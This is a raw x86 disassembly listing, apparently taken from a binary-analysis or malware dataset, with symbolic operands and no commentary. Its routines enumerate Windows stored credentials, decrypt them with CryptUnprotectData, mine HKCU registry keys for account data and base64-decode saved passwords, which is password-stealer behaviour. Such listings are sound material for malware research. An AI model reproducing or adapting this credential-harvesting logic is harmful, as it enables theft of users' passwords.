jmp r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x4c ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] ebx
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push ebx
push ebx
lea edx [ ebp - 0x54 ]
push edx
lea edx [ ebp - 0x50 ]
push edx
push [ ebp - 0x58 ]
lea edx [ ebp - 0x34 ]
push edx
lea edx [ ebp - 0x24 ]
push edx
push ebx
push eax
mov esi eax
call [ ecx + 0x44 ]
cmp eax ebx
jge r-xdata
cmp [ ebp - 0x40 ] 0x400
jge r-xdata
push r--data
push esi
push eax
call sub_10014400
jmp r-xdata
mov eax [ ebp - 0x4c ]
cmp eax ebx
je r-xdata
mov edi [ ebp - 0x44 ]
mov eax [ ebp - 0x44 ]
add edi 0xffffffe0
lea esi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edi [ eax - 0x10 ]
lea esi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x7f
push [ ebp - 0x58 ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ wcsncpy@IAT ]
mov eax [ ebp - 0x44 ]
xor ecx ecx
mov [ eax + 0xfe ] cx
mov ecx [ ebp - 0x54 ]
mov [ eax + 0x100 ] ecx
mov ecx [ ebp - 0x50 ]
add esp 0xc
inc [ ebp - 0x40 ]
mov [ eax + 0x104 ] ecx
add eax 0x128
jmp r-xdata
mov [ ebp - 0x44 ] eax
sub_1000e5a6
push ebp
mov ebp esp
sub esp 0x45c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x450 ] 0x0
push ebx
push esi
push edi
push 0x4a000
mov edi ecx
call [ malloc@IAT ]
mov esi eax
pop ecx
mov [ ebp - 0x45c ] esi
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x450 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
push esi
call sub_1000e346
pop ecx
test eax eax
jle r-xdata
push esi
call [ free@IAT ]
pop ecx
sub edi 0xffffff80
mov [ ebp - 0x440 ] edi
mov edi [ wcsncpy@IAT ]
add esi 0x20
mov [ ebp - 0x458 ] eax
mov ebx 0x80
add esi 0x128
dec [ ebp - 0x458 ]
jne r-xdata
mov eax [ esi + 0x100 ]
movsx eax [ eax ]
push eax
call [ isprint@IAT ]
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x104 ] 0x0
je r-xdata
mov esi [ ebp - 0x45c ]
push ebx
lea eax [ ebp - 0x1d0 ]
push 0x0
push eax
call [ memset@IAT ]
add esp 0xc
push 0x100
lea eax [ ebp - 0x338 ]
push 0x0
push eax
call [ memset@IAT ]
add esp 0xc
push 0x100
lea eax [ ebp - 0x438 ]
push 0x0
push eax
call [ memset@IAT ]
add esp 0xc
push ebx
lea eax [ ebp - 0x88 ]
push 0x0
push eax
call [ memset@IAT ]
mov eax [ esi - 0x20 ]
add esp 0xc
cmp eax 0x220d5cc1
je r-xdata
lea eax [ ebp - 0x1d0 ]
push r--data
push eax
call [ wcscpy@IAT ]
push ebx
lea eax [ ebp - 0x338 ]
push esi
push eax
call edi
add esp 0x14
xor eax eax
mov [ ebp - 0x23a ] ax
lea eax [ ebp - 0x44c ]
push eax
push 0x20019
push 0x0
push r--data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
cmp eax 0x5e7e8100
je r-xdata
push ebx
lea eax [ ebp - 0x438 ]
push esi
push eax
call edi
add esp 0xc
push eax
push eax
push eax
push eax
lea ecx [ ebp - 0x43c ]
push ecx
lea ecx [ ebp - 0x238 ]
push ecx
mov [ ebp - 0x454 ] eax
push eax
jmp r-xdata
push r--data
jmp r-xdata
cmp eax 0xb9819c52
je r-xdata
push eax
push [ esi + 0x100 ]
lea eax [ ebp - 0x88 ]
push eax
call [ strncpy@IAT ]
mov [ ebp - 0x9 ] 0x0
add esp 0xc
push 0x7f
pop eax
push [ ebp - 0x44c ]
mov [ ebp - 0x43c ] 0x64
call [ RegEnumKeyExA@IAT ]
cmp eax 0x103
jne r-xdata
lea eax [ ebp - 0x1d0 ]
push eax
call [ wcscpy@IAT ]
push ebx
lea eax [ ebp - 0x338 ]
push esi
push eax
call edi
add esp 0x14
xor eax eax
mov [ ebp - 0x23a ] ax
jmp r-xdata
push r--data
cmp eax 0xe161255a
lea eax [ ebp - 0x1d0 ]
je r-xdata
test eax eax
jne r-xdata
push [ ebp - 0x44c ]
call [ RegCloseKey@IAT ]
mov eax [ esi + 0x104 ]
cmp eax 0x7f
jbe r-xdata
push r--data
push eax
call [ wcscpy@IAT ]
push ebx
lea eax [ ebp - 0x338 ]
push esi
push eax
call edi
xor eax eax
mov [ ebp - 0x23a ] ax
mov eax [ esi + 0x104 ]
add esp 0x14
test eax eax
je r-xdata
push r--data
push eax
call [ wcscpy@IAT ]
push ebx
lea eax [ ebp - 0x438 ]
push esi
push eax
call edi
add esp 0x14
jmp r-xdata
inc [ ebp - 0x454 ]
xor eax eax
push eax
push eax
push eax
push eax
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x238 ]
push eax
push [ ebp - 0x454 ]
mov eax [ ebp - 0x43c ]
mov [ ebp + eax - 0x238 ] 0x0
lea eax [ ebp - 0x444 ]
push eax
push 0x20019
push 0x0
lea eax [ ebp - 0x238 ]
push eax
push [ ebp - 0x44c ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
push 0x40
lea eax [ ebp - 0x1d0 ]
push eax
mov eax [ ebp - 0x440 ]
add eax 0xffffff80
push eax
call edi
mov eax [ ebp - 0x440 ]
xor ecx ecx
add esp 0xc
mov [ eax - 0x2 ] cx
push 0x100
lea ecx [ ebp - 0x338 ]
push ecx
push eax
call edi
mov eax [ ebp - 0x440 ]
xor ecx ecx
add esp 0xc
mov [ eax + 0x1fe ] cx
push 0x40
lea ecx [ ebp - 0x438 ]
push ecx
add eax 0x200
push eax
call edi
mov eax [ ebp - 0x440 ]
add esp 0xc
xor ecx ecx
push 0x40
mov [ eax + 0x27e ] cx
add eax 0x280
push eax
push 0xffffffff
lea eax [ ebp - 0x88 ]
push eax
push ecx
push 0x1
call [ MultiByteToWideChar@IAT ]
inc [ ebp - 0x450 ]
add [ ebp - 0x440 ] 0x380
cdq
sub eax edx
sar eax 0x1
cmp eax 0x7f
jb r-xdata
xor eax eax
mov [ ebp - 0x33a ] ax
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x150 ]
push eax
lea eax [ ebp - 0x448 ]
push eax
push 0x0
push r--data
push [ ebp - 0x444 ]
mov [ ebp - 0x43c ] 0xc8
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
push eax
push [ esi + 0x100 ]
lea eax [ ebp - 0x438 ]
push eax
call edi
add esp 0xc
push [ esi + 0x100 ]
xor eax eax
mov [ ebp - 0x33a ] ax
call [ wcslen@IAT ]
pop ecx
mov ecx [ esi + 0x100 ]
lea eax [ ecx + eax * 2 + 0x2 ]
lea ecx [ ebp - 0x88 ]
jmp r-xdata
push 0x7f
pop eax
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x150 ]
push eax
lea eax [ ebp - 0x448 ]
push eax
push 0x0
push r--data
push [ ebp - 0x444 ]
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x448 ] 0x1
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
push [ ebp - 0x444 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x14c ]
push esi
push eax
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x14e ]
push esi
push eax
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x448 ] 0x2
jne r-xdata
mov dl [ eax ]
mov [ ecx ] dl
inc ecx
add eax 0x2
jmp r-xdata
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x150 ]
push eax
lea eax [ ebp - 0x448 ]
push eax
push 0x0
push r--data
lea eax [ ebp - 0x14e ]
push esi
push eax
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x150 ]
push eax
lea eax [ ebp - 0x448 ]
push eax
push 0x0
push r--data
jmp r-xdata
mov eax [ ebp - 0x43c ]
mov [ ebp + eax - 0x150 ] 0x0
push ebx
lea eax [ ebp - 0x150 ]
push eax
push esi
call edi
add esp 0xc
xor eax eax
mov [ esi + 0xfe ] ax
push [ ebp - 0x444 ]
mov [ ebp - 0x43c ] 0xc8
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
sub_1000ead9
push ebp
mov ebp esp
sub esp 0x384
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor esi esi
mov edi ecx
xor eax eax
movsx cx [ eax + r--data ]
shl cx 0x2
mov [ ebp + eax * 2 - 0x158 ] cx
inc eax
cmp eax 0x25
jl r-xdata
lea eax [ ebp - 0x158 ]
mov [ ebp - 0x370 ] eax
lea eax [ ebp - 0x35c ]
push eax
lea eax [ ebp - 0x364 ]
push eax
push esi
push esi
mov [ ebp - 0x374 ] 0x4a
mov [ ebp - 0x360 ] esi
call [ CredEnumerateW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x360 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
xor eax eax
mov [ ebp - 0x368 ] eax
cmp [ ebp - 0x364 ] esi
jbe r-xdata
push [ ebp - 0x35c ]
call [ CredFree@IAT ]
mov esi [ wcsncpy@IAT ]
add edi 0x27e
mov eax [ ebp - 0x368 ]
inc eax
mov [ ebp - 0x368 ] eax
cmp eax [ ebp - 0x364 ]
jb r-xdata
push r--data
call [ wcslen@IAT ]
push eax
mov eax [ ebp - 0x35c ]
mov eax [ eax + ebx * 4 ]
push r--data
push [ eax + 0x8 ]
call [ _wcsnicmp@IAT ]
add esp 0x10
test eax eax
jne r-xdata
mov ebx eax
mov eax [ ebp - 0x35c ]
mov eax [ eax + ebx * 4 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ ebp - 0x35c ]
mov ecx [ eax + ebx * 4 ]
mov ecx [ ecx + 0x1c ]
mov [ ebp - 0x378 ] ecx
mov eax [ eax + ebx * 4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x37c ] eax
lea eax [ ebp - 0x384 ]
push eax
xor eax eax
push eax
push eax
push eax
lea ecx [ ebp - 0x374 ]
push ecx
push eax
lea eax [ ebp - 0x37c ]
push eax
call [ CryptUnprotectData@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x380 ]
lea eax [ ebp - 0x358 ]
push r--data
push 0x100
push eax
call [ _snwprintf@IAT ]
lea eax [ ebp - 0x358 ]
push 0x3a
push eax
call [ wcschr@IAT ]
add esp 0x18
mov [ ebp - 0x36c ] eax
push 0x40
test eax eax
je r-xdata
lea eax [ ebp - 0x358 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
call esi
add esp 0xc
xor eax eax
mov [ ebp - 0xa ] ax
mov [ ebp - 0x108 ] ax
xor ecx ecx
mov [ eax ] cx
lea eax [ ebp - 0x358 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
call esi
xor eax eax
mov [ ebp - 0xa ] ax
mov eax [ ebp - 0x36c ]
add eax 0x2
push 0x40
push eax
lea eax [ ebp - 0x108 ]
push eax
call esi
add esp 0x18
xor eax eax
mov [ ebp - 0x8a ] ax
jmp r-xdata
push [ ebp - 0x380 ]
call [ LocalFree@IAT ]
lea eax [ edi - 0x27e ]
push r--data
push eax
call [ wcscpy@IAT ]
push 0x100
lea eax [ ebp - 0x358 ]
push eax
lea eax [ edi - 0x1fe ]
push eax
call esi
xor eax eax
mov [ edi ] ax
push 0x40
lea eax [ ebp - 0x88 ]
push eax
lea eax [ edi + 0x2 ]
push eax
call esi
xor eax eax
mov [ edi + 0x80 ] ax
push 0x40
lea eax [ ebp - 0x108 ]
push eax
lea eax [ edi + 0x82 ]
push eax
call esi
xor eax eax
add esp 0x2c
inc [ ebp - 0x360 ]
mov [ edi + 0x100 ] ax
add edi 0x380
push 0x100
push r--data
call [ wcslen@IAT ]
pop ecx
mov ecx [ ebp - 0x35c ]
mov ecx [ ecx + ebx * 4 ]
mov ecx [ ecx + 0x8 ]
lea eax [ ecx + eax * 2 ]
push eax
lea eax [ ebp - 0x358 ]
push eax
call esi
xor eax eax
add esp 0xc
cmp [ ebp - 0x360 ] 0x64
mov [ ebp - 0x15a ] ax
jae r-xdata
sub_1000ed7f
push ebp
mov ebp esp
sub esp 0x3c
push ebx
xor ebx ebx
push ebx
mov [ ebp - 0x4 ] ebx
call [ CoInitialize@IAT ]
lea eax [ ebp - 0xc ]
push eax
push r--data
push 0x1
push ebx
push r--data
mov [ ebp - 0xc ] ebx
call [ CoCreateInstance@IAT ]
test eax eax
js r-xdata
call [ CoUninitialize@IAT ]
mov eax [ ebp - 0x4 ]
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
push eax
call [ ecx + 0x1c ]
test eax eax
js r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
push esi
push edi
mov [ ebp - 0x8 ] eax
mov esi 0x400
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
lea edx [ ebp - 0x14 ]
push edx
lea edx [ ebp - 0x3c ]
push edx
push 0x1
push eax
call [ ecx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
pop edi
pop esi
cmp [ ebp - 0x38 ] ebx
je r-xdata
cmp [ ebp - 0x4 ] esi
jb r-xdata
push 0x3f
push [ ebp - 0x38 ]
call [ wcschr@IAT ]
pop ecx
pop ecx
cmp eax ebx
je r-xdata
xor ebx ebx
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
xor ecx ecx
mov [ eax ] cx
push 0x200
push [ ebp - 0x38 ]
push [ ebp - 0x8 ]
call [ wcsncpy@IAT ]
mov ecx [ ebp - 0x8 ]
xor eax eax
add esp 0xc
inc [ ebp - 0x4 ]
add [ ebp - 0x8 ] esi
mov [ ecx + 0x3fe ] ax
mov edi [ ebp + 0x8 ]
inc ebx
add edi esi
cmp ebx [ ebp - 0x4 ]
jb r-xdata
push [ ebp - 0x38 ]
push edi
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
sub_1000ee77
push ebp
mov ebp esp
sub esp 0x130
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0xf0000000
xor esi esi
push 0x1
push esi
mov [ ebp - 0x124 ] eax
mov [ eax ] 0x0
push esi
lea eax [ ebp - 0x12c ]
push eax
mov edi ecx
mov [ ebp - 0x12c ] esi
mov [ ebp - 0x120 ] esi
call [ CryptAcquireContextA@IAT ]
lea eax [ ebp - 0x120 ]
push eax
push esi
push esi
push 0x8004
push [ ebp - 0x12c ]
call [ CryptCreateHash@IAT ]
push esi
push edi
call [ wcslen@IAT ]
pop ecx
lea eax [ eax + eax + 0x2 ]
push eax
push edi
push [ ebp - 0x120 ]
call [ CryptHashData@IAT ]
test eax eax
je r-xdata
push esi
push [ ebp - 0x12c ]
call [ CryptReleaseContext@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10014571
leave
retn
push esi
lea eax [ ebp - 0x130 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x2
push [ ebp - 0x120 ]
mov [ ebp - 0x130 ] 0x14
call [ CryptGetHashParam@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x120 ]
call [ CryptDestroyHash@IAT ]
mov edi [ _snprintf@IAT ]
push ebx
mov ebx [ strncpy@IAT ]
mov [ ebp - 0x128 ] esi
mov [ ebp - 0x119 ] 0x0
mov esi 0x100
mov eax [ ebp - 0x128 ]
mov al [ ebp + eax - 0x18 ]
add [ ebp - 0x119 ] al
movzx eax al
push eax
push [ ebp - 0x124 ]
lea eax [ ebp - 0x118 ]
push r--data
push esi
push eax
call edi
push esi
lea eax [ ebp - 0x118 ]
push eax
push [ ebp - 0x124 ]
call ebx
add esp 0x20
inc [ ebp - 0x128 ]
cmp [ ebp - 0x128 ] 0x14
jl r-xdata
movzx eax [ ebp - 0x119 ]
push eax
push [ ebp - 0x124 ]
lea eax [ ebp - 0x118 ]
push r--data
push esi
push eax
call edi
push esi
lea eax [ ebp - 0x118 ]
push eax
push [ ebp - 0x124 ]
call ebx
add esp 0x20
xor esi esi
pop ebx
sub_1000efeb
push ebp
mov ebp esp
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x21c ] eax
mov eax [ ebp + 0xc ]
push esi
mov [ ebp - 0x234 ] eax
lea eax [ ebp - 0x208 ]
push edi
xor esi esi
push eax
mov [ ebp - 0x214 ] ecx
mov [ ebp - 0x220 ] esi
call sub_1000ee77
pop ecx
lea eax [ ebp - 0x210 ]
push eax
push 0x1
push esi
push r--data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x220 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
mov edi [ RegEnumValueA@IAT ]
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x218 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push esi
push [ ebp - 0x210 ]
mov [ ebp - 0x20c ] esi
mov [ ebp - 0x218 ] 0x100
call edi
mov ebx 0x103
jmp r-xdata
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x208 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
call [ strcmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
mov edi [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x20c ]
push eax
push esi
lea eax [ ebp - 0x238 ]
push eax
push esi
lea eax [ ebp - 0x108 ]
push eax
push [ ebp - 0x210 ]
call edi
push [ ebp - 0x20c ]
call [ operator delete[]@IAT ]
pop ecx
mov ebx eax
lea eax [ ebp - 0x20c ]
push eax
push ebx
lea eax [ ebp - 0x238 ]
push eax
push esi
lea eax [ ebp - 0x108 ]
push eax
push [ ebp - 0x210 ]
mov [ ebp - 0x230 ] ebx
call edi
test eax eax
jne r-xdata
inc [ ebp - 0x20c ]
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x218 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push [ ebp - 0x20c ]
mov [ ebp - 0x218 ] 0x100
push [ ebp - 0x210 ]
call edi
push [ ebp - 0x210 ]
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x20c ]
mov [ ebp - 0x248 ] eax
mov eax [ ebp - 0x214 ]
push eax
mov [ ebp - 0x244 ] ebx
mov [ ebp - 0x23c ] eax
call [ wcslen@IAT ]
pop ecx
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x240 ] eax
lea eax [ ebp - 0x22c ]
push eax
push 0x1
push esi
push esi
lea eax [ ebp - 0x240 ]
push eax
push esi
lea eax [ ebp - 0x248 ]
push eax
call [ CryptUnprotectData@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x230 ]
call [ operator delete@IAT ]
pop ecx
mov eax [ ebp - 0x228 ]
mov ebx [ eax ]
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
add ecx ebx
add ecx edx
cmp [ ebp - 0x22c ] ecx
jb r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ eax + 0x14 ]
add edx ebx
shr ecx 0x1
add edx eax
lea edi [ eax + 0x24 ]
mov [ ebp - 0x224 ] edx
cmp ecx esi
jle r-xdata
mov ebx [ wcsncpy@IAT ]
mov [ ebp - 0x220 ] 0x1
mov [ ebp - 0x214 ] ecx
jmp r-xdata
mov eax [ edi ]
mov esi [ edi + 0x10 ]
add eax edx
push 0x40
push eax
push [ ebp - 0x21c ]
add esi edx
call ebx
mov ecx [ ebp - 0x21c ]
push 0x40
push esi
mov esi [ ebp - 0x234 ]
xor eax eax
push esi
mov [ ecx + 0x7e ] ax
call ebx
xor eax eax
add esp 0x18
add edi 0x20
dec [ ebp - 0x214 ]
mov [ esi + 0x7e ] ax
jne r-xdata
mov edx [ ebp - 0x224 ]
mov eax [ ebp - 0x228 ]
sub_1000f25d
push ebp
mov ebp esp
sub esp 0x114
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10c ] 0x0
push ebx
push esi
mov ebx edx
push edi
push ebx
mov esi ecx
mov [ ebp - 0x114 ] ebx
call sub_1000ed7f
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x114 ]
call [ free@IAT ]
mov eax [ ebp - 0x10c ]
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
mov edi [ wcsncpy@IAT ]
add esi 0x27e
mov [ ebp - 0x110 ] eax
add ebx 0x400
dec [ ebp - 0x110 ]
jne r-xdata
lea eax [ esi - 0x27e ]
push r--data
push eax
call [ wcscpy@IAT ]
push 0x100
lea eax [ esi - 0x1fe ]
push ebx
push eax
call edi
xor eax eax
add esp 0x14
mov [ esi ] ax
push 0x40
lea eax [ ebp - 0x108 ]
push eax
lea eax [ esi + 0x2 ]
push eax
call edi
xor eax eax
add esp 0xc
mov [ esi + 0x80 ] ax
push 0x40
lea eax [ ebp - 0x88 ]
push eax
lea eax [ esi + 0x82 ]
push eax
call edi
xor eax eax
add esp 0xc
inc [ ebp - 0x10c ]
mov [ esi + 0x100 ] ax
add esi 0x380
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
mov ecx ebx
call sub_1000efeb
pop ecx
pop ecx
test eax eax
je r-xdata
sub_1000f362
push esi
mov esi eax
xor eax eax
push esi
mov [ esi ] r--data
mov [ esi + 0x31c ] eax
mov [ esi + 0x320 ] eax
mov [ esi + 0x324 ] eax
mov [ esi + 0x32c ] eax
mov [ esi + 0x330 ] eax
mov [ esi + 0x334 ] eax
mov [ esi + 0x338 ] eax
mov [ esi + 0x340 ] eax
mov [ esi + 0x344 ] eax
mov [ esi + 0x33c ] eax
mov [ esi + 0x34c ] eax
mov [ esi + 0x348 ] eax
mov [ esi + 0x350 ] eax
mov [ esi + 0x358 ] eax
mov [ esi + 0x354 ] eax
mov [ esi + 0x328 ] eax
call sub_1000fc82
test eax eax
je r-xdata
mov eax esi
pop esi
retn
mov ecx esi
call sub_1000fe30
test eax eax
je r-xdata
call sub_1000f9cc
test eax eax
je r-xdata
mov [ esi + 0x328 ] 0x1
sub_1000f3f9
push esi
mov esi ecx
mov eax [ esi + 0x31c ]
push edi
mov edi [ FreeLibrary@IAT ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x320 ]
test eax eax
je r-xdata
push eax
call edi
mov esi [ esi + 0x324 ]
test esi esi
je r-xdata
push eax
call edi
pop edi
pop esi
retn
push esi
call edi
sub_1000f433
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0xc ]
jl r-xdata
cmp [ ebp + 0xc ] 0x4
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebx ] ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
cmp [ ebx + 0x4 ] ecx
je r-xdata
cmp [ ebx + 0x8 ] ecx
je r-xdata
cmp [ ebx + 0xc ] ecx
je r-xdata
imul eax eax 0x380
add eax [ esi + 0x4 ]
push edi
push 0x380
push ecx
push eax
call [ memset@IAT ]
mov eax [ esi + 0x8 ]
imul eax eax 0x380
add eax [ esi + 0x4 ]
push r--data
push eax
call [ wcscpy@IAT ]
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
imul eax eax 0x380
mov edi [ strlen@IAT ]
add esp 0x14
push 0x100
lea eax [ eax + ecx + 0x80 ]
push eax
push [ ebx ]
call edi
pop ecx
push eax
push [ ebx ]
push 0x0
push 0x1
call [ MultiByteToWideChar@IAT ]
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
imul eax eax 0x380
xor edx edx
mov [ eax + ecx + 0x27e ] dx
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20c ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x20c ] eax
test eax eax
je r-xdata
push eax
call edi
pop ecx
cmp eax 0x4
jbe r-xdata
inc [ esi + 0x8 ]
pop edi
push eax
call edi
pop ecx
cmp eax 0x4
jbe r-xdata
push [ ebp - 0x20c ]
call edi
mov ecx eax
mov eax [ ebp - 0x20c ]
xor edx edx
cmp [ ecx + eax - 0x2 ] 0x3d
push eax
sete dl
mov [ ebp - 0x208 ] edx
call edi
imul eax eax 0x3
push [ ebp - 0x20c ]
shr eax 0x2
sub eax [ ebp - 0x208 ]
mov [ ebp - 0x208 ] eax
call edi
mov edx [ ebp - 0x20c ]
xor ecx ecx
add esp 0xc
cmp [ eax + edx - 0x1 ] 0x3d
mov eax [ ebp - 0x208 ]
sete cl
sub eax ecx
mov [ ebp - 0x208 ] eax
lea eax [ ebp - 0x204 ]
push eax
push [ ebx + 0x8 ]
call edi
pop ecx
push eax
push [ ebx + 0x8 ]
call [ esi + 0x348 ]
add esp 0xc
lea eax [ ebp - 0x208 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
push [ ebp - 0x208 ]
lea eax [ ebp - 0x204 ]
push eax
call sub_1000fee9
test eax eax
je r-xdata
push [ ebp - 0x20c ]
call edi
mov ecx eax
mov eax [ ebp - 0x20c ]
xor edx edx
cmp [ ecx + eax - 0x2 ] 0x3d
push eax
sete dl
mov [ ebp - 0x208 ] edx
call edi
imul eax eax 0x3
push [ ebp - 0x20c ]
shr eax 0x2
sub eax [ ebp - 0x208 ]
mov [ ebp - 0x208 ] eax
call edi
mov edx [ ebp - 0x20c ]
xor ecx ecx
add esp 0xc
cmp [ eax + edx - 0x1 ] 0x3d
mov eax [ ebp - 0x208 ]
sete cl
sub eax ecx
mov [ ebp - 0x208 ] eax
lea eax [ ebp - 0x204 ]
push eax
push [ ebx + 0x8 ]
call edi
pop ecx
push eax
push [ ebx + 0x8 ]
call [ esi + 0x348 ]
add esp 0xc
lea eax [ ebp - 0x208 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
push [ ebp - 0x208 ]
lea eax [ ebp - 0x204 ]
push eax
call sub_1000fee9
test eax eax
je r-xdata
cmp [ ebp - 0x20c ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x20c ] eax
je r-xdata
cmp [ ebp - 0x208 ] 0x0
je r-xdata
cmp [ ebp - 0x208 ] eax
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
imul eax eax 0x380
push 0x40
lea eax [ eax + ecx + 0x280 ]
push eax
push [ ebp - 0x208 ]
push [ ebp - 0x20c ]
push 0x0
push 0x1
call [ MultiByteToWideChar@IAT ]
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
imul eax eax 0x380
push [ ebp - 0x20c ]
xor edx edx
mov [ eax + ecx + 0x2fe ] dx
call [ free@IAT ]
pop ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
imul ecx ecx 0x380
push 0x40
lea ecx [ ecx + edx + 0x300 ]
push ecx
push [ ebp - 0x208 ]
push [ ebp - 0x20c ]
push eax
push 0x1
call [ MultiByteToWideChar@IAT ]
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
imul eax eax 0x380
push [ ebp - 0x20c ]
xor edx edx
mov [ eax + ecx + 0x37e ] dx
call [ free@IAT ]
pop ecx
sub_1000f74f
push 0x248
push r--data
call sub_10014f80
mov eax [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x258 ] esi
xor ecx ecx
cmp [ esi + 0x328 ] ecx
je r-xdata
xor eax eax
cmp eax ecx
je r-xdata
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] 0x64
mov [ ebp - 0x24c ] ecx
mov ebx 0x104
mov edi [ strlen@IAT ]
mov eax [ esi + 0x8 ]
jmp r-xdata
and [ ebp - 0x248 ] 0x0
lea eax [ ebp - 0x140 ]
push eax
call edi
pop ecx
test eax eax
je r-xdata
call sub_10014fc8
retn 0x4
cmp [ ebp - 0x254 ] 0x0
je r-xdata
mov eax [ ebp - 0x248 ]
lea eax [ ebp + eax - 0x140 ]
cmp [ eax ] 0x2f
jne r-xdata
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x244 ]
push eax
call [ strcpy@IAT ]
pop ecx
pop ecx
lea eax [ esi + 0x10 ]
push eax
